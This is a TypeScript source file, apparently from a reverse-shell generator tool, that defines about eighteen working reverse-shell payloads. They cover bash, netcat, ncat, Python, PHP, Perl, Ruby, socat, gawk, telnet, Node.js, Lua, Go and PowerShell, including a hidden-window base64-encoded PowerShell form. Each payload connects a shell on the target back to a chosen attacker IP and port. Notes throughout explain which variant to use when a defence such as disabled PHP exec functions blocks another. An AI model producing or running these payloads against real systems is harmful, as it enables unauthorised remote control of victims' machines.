import { bytesToBase64 } from "../encoding/bytes";
import { utf16leBytes } from "../hash/bytes";
import { OsFamily, ShellParams } from "./params";

export type ShellId = string;

export interface ShellFileSpec {
  extension: string;
  defaultMime: string;
  /** Produces the on-disk file body. Defaults to the raw one-liner text (with a "#!/bin/bash"
   *  shebang prepended for the shell-invoked variants) when omitted — see shShebang() below. */
  toFileBody?: (oneLiner: string, params: ShellParams) => string;
}

export interface ShellVariant {
  id: ShellId;
  label: string;
  group: string;
  os: OsFamily;
  /** Whether the shell-path input applies to this variant. Several payloads hardcode /bin/sh
   *  internally (confirmed during syntax verification) rather than taking a configurable path. */
  usesShellPath: boolean;
  /** A short, user-facing caveat about availability/preconditions — shown next to the picker.
   *  Every entry that isn't as universally available as plain bash/nc carries one of these rather
   *  than presenting itself with false confidence. */
  note?: string;
  render: (params: ShellParams) => string;
  /** Present only for variants with a genuine alternate encoded execution form (currently just
   *  PowerShell's -EncodedCommand, which requires UTF-16LE-then-base64, not UTF-8). */
  renderEncoded?: (params: ShellParams) => string;
  /** Overrides the generic `nc -lvnp <port>` companion listener for variants that pair with a
   *  different listener (e.g. socat). */
  listener?: (params: ShellParams) => string;
  file: ShellFileSpec;
}

const TEXT_PLAIN = "text/plain";

function shShebang(oneLiner: string): string {
  return `#!/bin/bash\n${oneLiner}\n`;
}

export const SHELLS: ShellVariant[] = [
  {
    id: "bash-dev-tcp",
    label: "Bash -i (/dev/tcp)",
    group: "Bash",
    os: "linux",
    usesShellPath: true,
    note: "Needs a bash build with --enable-net-redirections (default on most distros) — won't work under dash/sh.",
    render: (p) => `${p.shellPath} -i >& /dev/tcp/${p.ip}/${p.port} 0>&1`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "bash-dev-tcp-wrapped",
    label: "Bash -i (/dev/tcp, restricted-shell wrapper)",
    group: "Bash",
    os: "linux",
    usesShellPath: true,
    note: "Wraps the /dev/tcp trick in `bash -c` — useful when the current shell itself is restricted.",
    render: (p) => `bash -c '${p.shellPath} -i >& /dev/tcp/${p.ip}/${p.port} 0>&1'`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nc-e",
    label: "Netcat -e (traditional/GNU)",
    group: "Netcat",
    os: "linux",
    usesShellPath: true,
    note: "OpenBSD nc — the default on modern Debian/Ubuntu/Kali — does NOT support -e. Needs netcat-traditional or GNU netcat.",
    render: (p) => `nc -e ${p.shellPath} ${p.ip} ${p.port}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nc-mkfifo",
    label: "Netcat (mkfifo, no -e needed)",
    group: "Netcat",
    os: "linux",
    usesShellPath: true,
    note: "Works with any nc build, including OpenBSD nc.",
    render: (p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${p.shellPath} -i 2>&1|nc ${p.ip} ${p.port} >/tmp/f`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "ncat-exec",
    label: "Ncat --exec",
    group: "Netcat",
    os: "cross",
    usesShellPath: true,
    note: "Nmap's ncat always supports exec, unlike OpenBSD nc.",
    render: (p) => `ncat ${p.ip} ${p.port} -e ${p.shellPath}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "python",
    label: "Python (python)",
    group: "Python",
    os: "linux",
    usesShellPath: false,
    note: "The `python` binary may not exist on modern systems — use the python3 variant if this fails.",
    render: (p) =>
      `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${p.ip}",${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
    file: {
      extension: "py",
      defaultMime: "text/x-python",
      toFileBody: (_o, p) =>
        `import socket, os, pty\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${p.ip}", ${p.port}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\npty.spawn("/bin/sh")\n`,
    },
  },
  {
    id: "python3",
    label: "Python (python3)",
    group: "Python",
    os: "linux",
    usesShellPath: false,
    render: (p) =>
      `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${p.ip}",${p.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
    file: {
      extension: "py",
      defaultMime: "text/x-python",
      toFileBody: (_o, p) =>
        `import socket, os, pty\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${p.ip}", ${p.port}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\npty.spawn("/bin/sh")\n`,
    },
  },
  {
    id: "php-exec",
    label: "PHP (exec/fsockopen)",
    group: "PHP",
    os: "linux",
    usesShellPath: false,
    note: "Fails if exec() is in disable_functions (common on shared hosting) — try the proc_open variant instead.",
    render: (p) => `php -r '$sock=fsockopen("${p.ip}",${p.port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    file: {
      extension: "php",
      defaultMime: "application/x-httpd-php",
      toFileBody: (_o, p) => `<?php\n$sock = fsockopen("${p.ip}", ${p.port});\nexec("/bin/sh -i <&3 >&3 2>&3");\n`,
    },
  },
  {
    id: "php-proc-open",
    label: "PHP (proc_open fallback)",
    group: "PHP",
    os: "linux",
    usesShellPath: false,
    note: "Use when exec()/shell_exec() are disabled but proc_open() isn't.",
    render: (p) =>
      `php -r '$sock=fsockopen("${p.ip}",${p.port});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
    file: {
      extension: "php",
      defaultMime: "application/x-httpd-php",
      toFileBody: (_o, p) =>
        `<?php\n$sock = fsockopen("${p.ip}", ${p.port});\n$pipes = [];\n$proc = proc_open("/bin/sh -i", [0 => $sock, 1 => $sock, 2 => $sock], $pipes);\n`,
    },
  },
  {
    id: "perl",
    label: "Perl",
    group: "Perl",
    os: "linux",
    usesShellPath: false,
    render: (p) =>
      `perl -e 'use Socket;$i="${p.ip}";$p=${p.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    file: {
      extension: "pl",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `#!/usr/bin/perl\nuse Socket;\n$i = "${p.ip}";\n$p = ${p.port};\nsocket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));\nif (connect(S, sockaddr_in($p, inet_aton($i)))) {\n  open(STDIN, ">&S");\n  open(STDOUT, ">&S");\n  open(STDERR, ">&S");\n  exec("/bin/sh -i");\n}\n`,
    },
  },
  {
    id: "ruby",
    label: "Ruby",
    group: "Ruby",
    os: "linux",
    usesShellPath: false,
    render: (p) => `ruby -rsocket -e'f=TCPSocket.open("${p.ip}",${p.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    file: {
      extension: "rb",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `#!/usr/bin/env ruby\nrequire 'socket'\nf = TCPSocket.open("${p.ip}", ${p.port}).to_i\nexec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)\n`,
    },
  },
  {
    id: "socat",
    label: "Socat",
    group: "Socat",
    os: "linux",
    usesShellPath: true,
    note: "Requires the socat binary on the target — not installed by default on most distros. Pairs with a socat listener, not plain nc.",
    render: (p) => `socat exec:'${p.shellPath} -li',pty,stderr,setsid,sigint,sane tcp:${p.ip}:${p.port}`,
    listener: (p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p.port}`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "awk",
    label: "Awk (gawk only)",
    group: "Awk",
    os: "linux",
    usesShellPath: false,
    note: "Requires gawk specifically — the /inet/tcp special file is a gawk extension. Silently fails on mawk/BusyBox awk.",
    render: (p) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${p.ip}/${p.port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "telnet",
    label: "Telnet (mkfifo)",
    group: "Telnet",
    os: "linux",
    usesShellPath: false,
    note: "Telnet has no native fd redirection, so this relies on the same mkfifo trick as the netcat variant.",
    render: (p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet ${p.ip} ${p.port} >/tmp/f`,
    file: { extension: "sh", defaultMime: "text/x-shellscript", toFileBody: (o) => shShebang(o) },
  },
  {
    id: "nodejs",
    label: "Node.js",
    group: "Node.js",
    os: "cross",
    usesShellPath: false,
    note: "Requires node on the target — uncommon outside dev boxes or Node-based app containers.",
    render: (p) =>
      `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p.port},"${p.ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`,
    file: {
      extension: "js",
      defaultMime: "text/javascript",
      toFileBody: (_o, p) =>
        `const net = require("net");\nconst cp = require("child_process");\nconst sh = cp.spawn("/bin/sh", []);\nconst client = new net.Socket();\nclient.connect(${p.port}, "${p.ip}", function () {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n});\n`,
    },
  },
  {
    id: "lua",
    label: "Lua",
    group: "Lua",
    os: "linux",
    usesShellPath: false,
    note: "Requires the luasocket library — not part of stock Lua and frequently absent even when the lua binary exists.",
    render: (p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${p.ip}','${p.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    file: {
      extension: "lua",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `require('socket')\nrequire('os')\nt = socket.tcp()\nt:connect('${p.ip}', '${p.port}')\nos.execute('/bin/sh -i <&3 >&3 2>&3')\n`,
    },
  },
  {
    id: "golang",
    label: "Golang (go run)",
    group: "Golang",
    os: "cross",
    usesShellPath: false,
    note: "Needs the full Go toolchain installed on the target, not just a compiled binary — uncommon outside dev/CI hosts.",
    render: (p) =>
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${p.ip}:${p.port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
    file: {
      extension: "go",
      defaultMime: TEXT_PLAIN,
      toFileBody: (_o, p) =>
        `package main\n\nimport (\n\t"net"\n\t"os/exec"\n)\n\nfunc main() {\n\tc, _ := net.Dial("tcp", "${p.ip}:${p.port}")\n\tcmd := exec.Command("/bin/sh")\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\n`,
    },
  },
  {
    id: "powershell",
    label: "PowerShell TCP client",
    group: "PowerShell",
    os: "windows",
    usesShellPath: false,
    render: (p) => `powershell -nop -c "${powershellScript(p)}"`,
    renderEncoded: (p) => {
      const bytes = utf16leBytes(powershellScript(p));
      return `powershell -nop -w hidden -e ${bytesToBase64(bytes)}`;
    },
    file: {
      extension: "ps1",
      defaultMime: "application/octet-stream",
      toFileBody: (_o, p) => `${powershellScript(p)}\n`,
    },
  },
];

function powershellScript(p: ShellParams): string {
  return (
    `$client = New-Object System.Net.Sockets.TCPClient('${p.ip}',${p.port});` +
    `$stream = $client.GetStream();` +
    `[byte[]]$bytes = 0..65535|%{0};` +
    `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;` +
    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);` +
    `$sendback = (iex $data 2>&1 | Out-String );` +
    `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';` +
    `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);` +
    `$stream.Write($sendbyte,0,$sendbyte.Length);` +
    `$stream.Flush()};` +
    `$client.Close()`
  );
}

export const SHELLS_BY_ID: Record<ShellId, ShellVariant> = Object.fromEntries(SHELLS.map((s) => [s.id, s]));

export const SHELL_GROUPS: string[] = [...new Set(SHELLS.map((s) => s.group))];
